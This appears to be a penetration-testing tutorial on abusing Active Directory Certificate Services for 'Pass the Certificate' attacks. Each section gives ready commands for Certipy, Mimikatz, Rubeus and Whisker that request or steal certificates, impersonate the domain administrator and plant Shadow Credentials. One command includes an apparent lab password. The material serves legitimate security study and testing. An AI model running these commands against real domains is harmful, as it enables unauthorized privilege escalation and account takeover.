---
title: "Pass the Certificate"
description: "Abusing Active Directory Certificate Services (AD CS) for authentication and privilege escalation using Pass the Certificate."
tags:
  - password-attacks
  - lateral-movement
  - ad-cs
  - pass-the-certificate
  - pki
  - certipy
  - rubeus
---

# 📜 Pass the Certificate

**Pass the Certificate** is an advanced authentication and lateral movement technique that abuses Active Directory Certificate Services (AD CS).

AD CS is Microsoft's Public Key Infrastructure (PKI) implementation. It allows organizations to issue digital certificates for various purposes, including user and machine authentication. If an attacker can extract or fraudulently request a valid client authentication certificate for a user, they can use that certificate to request a Kerberos TGT on behalf of that user.

This attack is extremely powerful because certificates are long-lived (often 1-5 years), bypass password resets, and can bypass Smart Card requirements.

---

## 1️⃣ Understanding Certificate Authentication

In a typical AD CS environment:

1. A user (or an attacker acting as the user) requests a certificate from the Enterprise Certificate Authority (CA) using a specific **Certificate Template**.
2. The CA issues a certificate (e.g., a `.pfx` file) valid for Client Authentication.
3. The user presents this certificate to the Domain Controller during the Kerberos pre-authentication phase (known as PKINIT).
4. The Domain Controller verifies the certificate and issues a Kerberos TGT to the user.

If you steal a user's `.pfx` file (or generate one via an AD CS misconfiguration), you effectively own that user account until the certificate expires or is manually revoked.

---

## 2️⃣ Identifying AD CS in the Domain

Before you can attack Certificate Services, you must identify if a Certificate Authority (CA) exists in the environment.

### Using Certipy (From Linux)
Certipy includes a `find` module that queries LDAP to identify Enterprise CAs and vulnerable certificate templates.
```bash
# Find CAs and output to JSON/Text files
certipy find -u user@corp.local -p Password123 -dc-ip 10.10.10.10
```

### Using NetExec (From Linux)
NetExec has a built-in LDAP module specifically for querying the `pKIEnrollmentService` object class to identify if a PKI Enrollment Server exists.
```bash
# Query LDAP for AD CS servers
netexec ldap 10.10.10.10 -u user -p 'Password123!' -M adcs
```

### Using Certutil (From Windows)
If you have a shell on a domain-joined Windows machine, you can use the built-in `certutil.exe` to locate the CA.
```cmd
# List Enterprise Certificate Authorities
certutil.exe -config - -ping
```

---

## 3️⃣ Extracting Certificates from a Compromised Host

If you have compromised a Windows machine, you can search for and extract stored certificates.

### Using Mimikatz (Requires SYSTEM)
```cmd
mimikatz # privilege::debug
mimikatz # crypto::certificates /export
```
This extracts certificates from the machine and user stores, saving them to disk (often as `.pfx` or `.der` files). The password for the exported `.pfx` files is usually `mimikatz`.

### Using Seatbelt
Seatbelt can identify certificates stored on the system:
```cmd
Seatbelt.exe Certificates
```

---

## 4️⃣ Requesting Certificates via AD CS Misconfigurations

The most common way attackers obtain certificates is by finding misconfigured Certificate Templates (such as those identified by the tools Certify or Certipy).

For example, if a template allows "Enrollee Supplies Subject" (ESC1), any authenticated user can request a certificate and specify *any* name they want — including a Domain Admin.

### Finding Vulnerable Templates
Before requesting a certificate, you need to find a template that is misconfigured (e.g., ESC1, ESC8). You can use `certipy-ad` (the Kali package name for Certipy) to specifically filter for vulnerable templates and print the results directly to the terminal.

```bash
# Find vulnerable templates and print to stdout
certipy-ad find -vulnerable -stdout -u wwhite -p 'package5shores_topher1' -dc-ip 10.129.234.174
```

### Requesting a Cert with Certipy (From Linux)
Once you identify a vulnerable template (e.g., one that allows Enrollee Supplies Subject - ESC1), you can request a certificate as any user.

```bash
certipy req -u user@corp.local -p Password123 -ca CORP-CA -template VulnerableTemplate -upn administrator@corp.local
```
This requests a certificate for the `administrator` user and saves it as `administrator.pfx`.

---

## 5️⃣ Performing Pass the Certificate (From Linux)

Once you have a `.pfx` file, you can use it to request a Kerberos TGT from the Domain Controller.

### Using Certipy
```bash
# Request the TGT using the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Certipy will output the user's NT hash (calculated from the PKINIT response, a technique called "UnPAC-the-hash") and save the TGT as a `.ccache` file.

You can then export the `.ccache` file and use it with Impacket (Pass the Ticket):
```bash
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass administrator@dc01.corp.local
```

---

## 6️⃣ Performing Pass the Certificate (From Windows)

If you are attacking from a Windows machine, you can use **Rubeus** to request the TGT and inject it directly into memory.

### Using Rubeus
```cmd
# Request a TGT using the certificate and immediately inject it (/ptt)
Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:mimikatz /ptt
```

Once injected, you can interact with the network as the `administrator` user.

---

## 7️⃣ Shadow Credentials (Key Trust Abuse)

A modern variation of Pass the Certificate is the **Shadow Credentials** attack. Instead of requesting a certificate from a CA, the attacker writes their own public key directly into the `msDS-KeyCredentialLink` attribute of a target object (like a Domain Admin account or a Computer object).

This requires generic write privileges over the target object, but it completely bypasses the need for a Certificate Authority.

### Using Whisker (Windows)
```cmd
# Add a shadow credential to the target user
Whisker.exe add /target:administrator

# Whisker outputs a Rubeus command containing the new certificate. Copy and run it:
Rubeus.exe asktgt /user:administrator /certificate:<Base64Cert> /password:<GeneratedPassword> /ptt
```

### Using Certipy (Linux)
```bash
# Add a shadow credential
certipy shadow auto -u user@corp.local -p Password123 -account administrator
```

---

!!! warning
    **Certificate abuse is a complex topic.** While PtH and PtT are straightforward, AD CS attacks require a solid understanding of PKI. However, because AD CS misconfigurations are rampant and difficult to patch without breaking infrastructure, Pass the Certificate is currently one of the most reliable privilege escalation paths in Active Directory.
